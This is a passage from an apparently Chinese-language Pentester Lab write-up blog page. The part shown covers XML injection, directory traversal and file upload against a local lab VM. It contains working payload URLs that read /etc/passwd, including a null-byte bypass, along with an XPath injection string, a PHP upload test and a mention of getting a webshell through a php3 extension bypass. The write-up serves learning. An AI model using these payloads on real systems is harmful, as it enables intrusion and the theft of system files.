&gt;]&gt;&lt;text&gt;&amp;pen;&lt;/text&gt;</span></span><br></pre></td></tr></table></figure></p>
+<p>SYSTEM之后的参数可以如下协议：<br><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">file:</span><span class="comment">//</span></span><br><span class="line"><span class="string">http:</span><span class="comment">//</span></span><br><span class="line"><span class="string">php:</span><span class="comment">//</span></span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_2-5">Example 2</h2><p>这个是XML Injection，以前做过，也写过wp，<a href="http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100" target="_blank" rel="external">http://old.lazysheep.cc/2015/04/15/0x20/#0x1_%E5%8F%A6%E7%B1%BB%E7%9A%84%E6%B3%A8%E5%85%A5_|_POINT_:_100</a><br>Payload:<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://192.168.56.101/xml/example2.php?name=hacker<span class="number">%27</span><span class="number">%5</span>D<span class="number">%20</span><span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%7</span>C<span class="number">%20</span><span class="number">%2</span>f<span class="number">%2</span>f<span class="number">%2</span>a<span class="number">%5</span>B<span class="number">%27</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="Directory_traversal">Directory traversal</h1><h2 id="Example_1-6">Example 1</h2><p>打开来看啥也没有。。不明所以，看了下源码，是没做任何过滤的任意文件读取，，<br>Payload:<br><figure class="highlight coffeescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>:<span class="regexp">//</span><span class="number">192.168</span>.56.101<span class="regexp">/dirtrav/example1.php?file=../</span>..<span class="regexp">/../</span>../etc/passwd</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_2-6">Example 2</h2><p>也不难。。。几乎也跟没过滤一样<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.101/dirtrav</span><span class="regexp">/example2.php?file=/var</span><span class="regexp">/www/files</span><span class="regexp">/../</span>../../etc/passwd</span><br></pre></td></tr></table></figure></p>
+<h2 id="Example_3-4">Example 3</h2><p>这题的这正则有跟没有一样。。。不能匹配到结尾的<code>\x00</code><br>Payload:<br><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/192.168.56.101/dirtrav</span><span class="regexp">/example3.php?file=../</span>../../etc/passwd%<span class="number">00</span></span><br></pre></td></tr></table></figure></p>
+<h1 id="File_Upload">File Upload</h1><h2 id="Example_1-7">Example 1</h2><p>同样是没做过滤。。。<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo "<span class="php"><span class="preprocessor">&lt;?php</span> phpinfo();<span class="preprocessor">?&gt;</span></span>" &gt; /tmp/test.php</span><br></pre></td></tr></table></figure></p>
+<p>把 <code>/tmp/test.php</code> 上传上去，然后可以直接访问。。同样可以写一句话getshell</p>
+<h2 id="Example_2-7">Example 2</h2><p>这题过滤了php结尾的文件。。。然后php3 bypass后可成功执行</p>
+</span>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Pentest/" rel="tag">#Pentest</a>
+          
+        </div>
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2016/03/17/0x14/" rel="next">0CTF RSA?总结 || RSA学习笔记</a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+            </div>
+
+            
+
+            
+              <div class="comments" id="comments">
+                
+                  <div class="ds-thread" data-thread-key="2016/03/21/0x15/"
+                       data-title="Pentester Lab Writeup" data-url="http://lazysheep.cc/2016/03/21/0x15/">
+                  </div>
+                
+              </div>
+            
+        </div>
+
+        
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar" style="overflow:scroll">
+    <div class="sidebar-inner">
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            Table Of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" src="/img/default_avatar.jpg" alt="Hcamael" itemprop="image"/>
+          <p class="site-author-name" itemprop="name">Hcamael</p>
+        </div>
+        <p class="site-description motion-element" itemprop="description">水平不济整日被虐这也不会那也得学脑子太蠢天天垫底这看不懂那学不会</p>
+        <nav class="site-state motion-element">
+          <div class="site-state-item site-state-posts">
+            <a href="/archives">
+              <span class="icon-archives" style="color:white"></span><span class="site-state-item-count">17</span>
+              <span class="site-state-item-name">posts</span>
+            </a>
+          </div>
+
+          <div class="site-state-item site-state-categories">
+            <a href="/categories">
+            <span class="icon-categories" style="color:white"></span>
+              <span class="site-state-item-count">3</span>
+              <span class="site-state-item-name">categories</span>
+              </a>
+          </div>
+
+          <div class="site-state-item site-state-tags">
+            <a href="/tags">
+            <span class="icon-tags" style="color:white"></span>
+              <span class="site-state-item-count">13</span>
+              <span class="site-state-item-name">tags</span>
+              </a>
+          </div>
+
+        </nav>
+
+        
+          <div class="feed-link motion-element">
+            <a href="/atom.xml" rel="alternate" style="text-align:center;" >
+              <i class="menu-item-icon icon-feed" ></i>
+              RSS
+            </a>
+          </div>
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-github" ></span>
+                <a href="https://github.com/Hcamael" target="_blank">github</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-twitter" ></span>
+                <a href="https://twitter.com/2_wat1r" target="_blank">twitter</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-weibo" ></span>
+                <a href="http://weibo.com/hcamael" target="_blank">weibo</a>
+              </span>
+              <br>
+            
+ 	<span class="links-of-author-item">
+              <span class="icon-zhihu" ></span>
+                <a href="http://www.zhihu.com/people/hcamael" target="_blank">zhihu</a>
+              </span>
+              <br>
+            
+          
+        </div>
+
+        
+        
+
+        <div class="links-of-author motion-element">
+          
+            <p class="site-author-name">Links</p>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://hduisa.cn" target="_blank">HDUISA</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://lightless.me" target="_blank">lightless</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://homeway.me" target="_blank">夏日小草</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://www.edwardl.xyz" target="_blank">Edward_L</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://evilddog.space" target="_blank">evilddog</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://aklis.info" target="_blank">Aklis</a>
+              </span>
+              <br>
+            
+              <span class="links-of-author-item">
+              <span class="icon-link"></span>
+              <a href="http://libc.pw" target="_blank">Explorer</a>
+              </span>
+              <br>
+            
+          
+        </div>
+
+      </section>
+
+      
+        <section class="post-toc-wrap sidebar-panel-active">
+          <div class="post-toc-indicator-top post-toc-indicator"></div>
+          <div class="post-toc">
+            
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SQLI"><span class="nav-number">1.</span> <span class="nav-text">SQLI</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1"><span class="nav-number">1.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2"><span class="nav-number">1.2.</span> <span class="nav-text">Example 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_3"><span class="nav-number">1.3.</span> <span class="nav-text">Example 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_4"><span class="nav-number">1.4.</span> <span class="nav-text">Example 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_5"><span class="nav-number">1.5.</span> <span class="nav-text">Example 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_6"><span class="nav-number">1.6.</span> <span class="nav-text">Example 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_7"><span class="nav-number">1.7.</span> <span class="nav-text">Example 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_8"><span class="nav-number">1.8.</span> <span class="nav-text">Example 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_9"><span class="nav-number">1.9.</span> <span class="nav-text">Example 9</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS"><span class="nav-number">2.</span> <span class="nav-text">XSS</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-1"><span class="nav-number">2.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-1"><span class="nav-number">2.2.</span> <span class="nav-text">Example 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_3-1"><span class="nav-number">2.3.</span> <span class="nav-text">Example 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_4-1"><span class="nav-number">2.4.</span> <span class="nav-text">Example 4</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_5-1"><span class="nav-number">2.5.</span> <span class="nav-text">Example 5</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_6-1"><span class="nav-number">2.6.</span> <span class="nav-text">Example 6</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exmple_7"><span class="nav-number">2.7.</span> <span class="nav-text">Exmple 7</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_8-1"><span class="nav-number">2.8.</span> <span class="nav-text">Example 8</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_9-1"><span class="nav-number">2.9.</span> <span class="nav-text">Example 9</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#File_Include"><span class="nav-number">3.</span> <span class="nav-text">File Include</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-2"><span class="nav-number">3.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-2"><span class="nav-number">3.2.</span> <span class="nav-text">Example 2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Code_injection"><span class="nav-number">4.</span> <span class="nav-text">Code injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-3"><span class="nav-number">4.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-3"><span class="nav-number">4.2.</span> <span class="nav-text">Example 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_3-2"><span class="nav-number">4.3.</span> <span class="nav-text">Example 3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_4-2"><span class="nav-number">4.4.</span> <span class="nav-text">Example 4</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Commands_injecttion"><span class="nav-number">5.</span> <span class="nav-text">Commands injecttion</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-4"><span class="nav-number">5.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-4"><span class="nav-number">5.2.</span> <span class="nav-text">Example 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_3-3"><span class="nav-number">5.3.</span> <span class="nav-text">Example 3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XML_attacks"><span class="nav-number">6.</span> <span class="nav-text">XML attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-5"><span class="nav-number">6.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-5"><span class="nav-number">6.2.</span> <span class="nav-text">Example 2</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#Directory_traversal"><span class="nav-number">7.</span> <span class="nav-text">Directory traversal</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-6"><span class="nav-number">7.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-6"><span class="nav-number">7.2.</span> <span class="nav-text">Example 2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_3-4"><span class="nav-number">7.3.</span> <span class="nav-text">Example 3</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#File_Upload"><span class="nav-number">8.</span> <span class="nav-text">File Upload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_1-7"><span class="nav-number">8.1.</span> <span class="nav-text">Example 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Example_2-7"><span class="nav-number">8.2.</span> <span class="nav-text">Example 2</span></a></li></ol></li></ol></div>
+            
+          </div>
+          <div class="post-toc-indicator-bottom post-toc-indicator"></div>
+        </section>
+      
+
+    </div>
+  </aside>
+
+
+    </main>
+
+    <footer id="footer" class="footer">
+        <div class="footer-inner">
+            <div class="copyright" >
+  
+  &copy; &nbsp; 
+  <span itemprop="copyrightYear">2016</span>
+  <span class="with-love">
+    <i class="icon-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Hcamael</span>
+</div>
+
+<div class="powered-by">
+  Powered by <a class="theme-link" href="http://hexo.io">Hexo</a>
+</div>
+
+<div class="theme-info">
+  Theme -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT
+  </a>
+</div>
+
+
+
+        </div>
+    </footer>
+
+    <div class="back-to-top"></div>
+</div>
+
+<script type="text/javascript" src="/vendors/jquery/index.js?v=2.1.3"></script>
+
+  
+  
+  
+    
+
+  
+    
+  
+
+  <script type="text/javascript">
+    var duoshuoQuery = {short_name:"hcamael"};
+    (function() {
+      var ds = document.createElement('script');
+      ds.type = 'text/javascript';ds.async = true;
+      ds.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.unstable.js';
+      ds.charset = 'UTF-8';
+      (document.getElementsByTagName('head')[0]
+      || document.getElementsByTagName('body')[0]).appendChild(ds);
+    })();
+  </script>
+    
+     
+  	<script src="/js/ua-parser.min.js"></script>
+  	<script src="/js/hook-duoshuo.js"></script>
+  
+
+
+    
+  
+  
+  <script type="text/javascript" src="/vendors/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script type="text/javascript" src="/js/fancy-box.js?v=0.4.4"></script>
+
+
+  <script type="text/javascript" src="/js/helpers.js?v=0.4.4"></script>
+  
+
+  <script type="text/javascript" src="/vendors/velocity/velocity.min.js"></script>
+  <script type="text/javascript" src="/vendors/velocity/velocity.ui.min.js"></script>
+
+  <script type="text/javascript" src="/js/motion_global.js?v=0.4.4" id="motion.global"></script>
+
+
+
+  <script type="text/javascript" src="/js/search-toggle.js"></script>
+
+
+  
+<script type="text/javascript" src="/js/bootstrap.scrollspy.js?v=0.4.4" id="bootstrap.scrollspy.custom"></script>
+
+
+<script type="text/javascript" id="sidebar.toc.highlight">
+  $(document).ready(function () {
+    var tocSelector = '.post-toc';
+    var $tocSelector = $(tocSelector);
+    var activeCurrentSelector = '.active-current';
+
+    $tocSelector
+      .on('activate.bs.scrollspy', function () {
+        var $currentActiveElement = $(tocSelector + ' .active').last();
+
+        removeCurrentActiveClass();
+        $currentActiveElement.addClass('active-current');
+
+        $tocSelector[0].scrollTop = $currentActiveElement.position().top;
+      })
+      .on('clear.bs.scrollspy', function () {
+        removeCurrentActiveClass();
+      });
+
+    function removeCurrentActiveClass () {
+      $(tocSelector + ' ' + activeCurrentSelector)
+        .removeClass(activeCurrentSelector.substring(1));
+    }
+
+    function processTOC () {
+      getTOCMaxHeight();
+      toggleTOCOverflowIndicators();
+    }
+
+    function getTOCMaxHeight () {
+      var height = $('.sidebar').height() -
+                   $tocSelector.position().top -
+                   $('.post-toc-indicator-bottom').height();
+
+      $tocSelector.css('height', height);
+
+      return height;
+    }
+
+    function toggleTOCOverflowIndicators () {
+      tocOverflowIndicator(
+        '.post-toc-indicator-top',
+        $tocSelector.scrollTop() > 0 ? 'show' : 'hide'
+      );
+
+      tocOverflowIndicator(
+        '.post-toc-indicator-bottom',
+        $tocSelector.scrollTop() >= $tocSelector.find('ol').height() - $tocSelector.height() ? 'hide' : 'show'
+      )
+    }
+
+    $(document).on('sidebar.motion.complete', function () {
+      processTOC();
+    });
+
+    $('body').scrollspy({ target: tocSelector });
+    $(window).on('resize', function () {
+      if ( $('.sidebar').hasClass('sidebar-active') ) {
+        processTOC();
+      }
+    });
+
+    onScroll($tocSelector);
+
+    function onScroll (element) {
+      element.on('mousewheel DOMMouseScroll', function (event) {
+          var oe = event.originalEvent;
+          var delta = oe.wheelDelta || -oe.detail;
+          var self = this;
+
+          this.scrollTop += ( delta < 0 ? 1 : -1 ) * 30;
+          event.preventDefault();
+
+          toggleTOCOverflowIndicators();
+      });
+    }
+
+    function tocOverflowIndicator (indicator, action) {
+      $(indicator).velocity('stop').velocity({
+        opacity: action === 'show' ? 0.4 : 0
+      }, { duration: 100 });
+    }
+
+  });
+</script>
+
+
+  <script type="text/javascript" id="sidebar.nav">
+    $(document).ready(function () {
+      var html = $('html');
+
+      $('.sidebar-nav li').on('click', function () {
+        var item = $(this);
+        var activeTabClassName = 'sidebar-nav-active';
+        var activePanelClassName = 'sidebar-panel-active';
+        if (item.hasClass(activeTabClassName)) {
+          return;
+        }
+
+        var currentTarget = $('.' + activePanelClassName);
+        var target = $('.' + item.data('target'));
+
+        currentTarget.velocity('transition.slideUpOut', 200, function () {
+          target
+            .velocity('stop')
+            .velocity('transition.slideDownIn', 200)
+            .addClass(activePanelClassName);
+        });
+
+        item.siblings().removeClass(activeTabClassName);
+        item.addClass(activeTabClassName);
+      });
+
+      $('.post-toc a').on('click', function (e) {
+        e.preventDefault();
+        var offset = $(escapeSelector(this.getAttribute('href'))).offset().top;
+        html.velocity('stop').velocity('scroll', {
+          offset: offset  + 'px',
+          mobileHA: false
+        });
+      });
+
+      // Expand sidebar on post detail page by default, when post has a toc.
+      var $tocContent = $('.post-toc-content');
+      if (isDesktop() && CONFIG.sidebar === 'post') {
+        if ($tocContent.length > 0 && $tocContent.html().trim().length > 0) {
+          displaySidebar();
+        }
+      }
+    });
+  </script>
+
+
+
+
+<script type="text/javascript">
+    $(document).ready(function () {
+        if (CONFIG.sidebar === 'always') {
+            displaySidebar();
+        }
+    });
+</script>
+
+
+
+
+
+
+
+
+<!-- lazyload -->
+<script type="text/javascript" src="/js/lazyload.js"></script>
+<script type="text/javascript">
+    jQuery(function () {
+        jQuery("#posts img").lazyload({
+            placeholder: "/img/loading.gif",
+            effect: "fadeIn"
+        });
+    });
+</script>
+
+<!-- Begin: Injected MathJax -->
+<script type="text/x-mathjax-config">
+  MathJax.Hub.Config({"tex2jax":{"inlineMath":[["$","$"],["\\(","\\)"]],"skipTags":["script","noscript","style","textarea","pre","code"],"processEscapes":true},"TeX":{"equationNumbers":{"autoNumber":"AMS"}}});
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for(i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.mathjax.org/mathjax/latest/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+</script>
+<!-- End: Injected MathJax -->
+</body>
+</html>
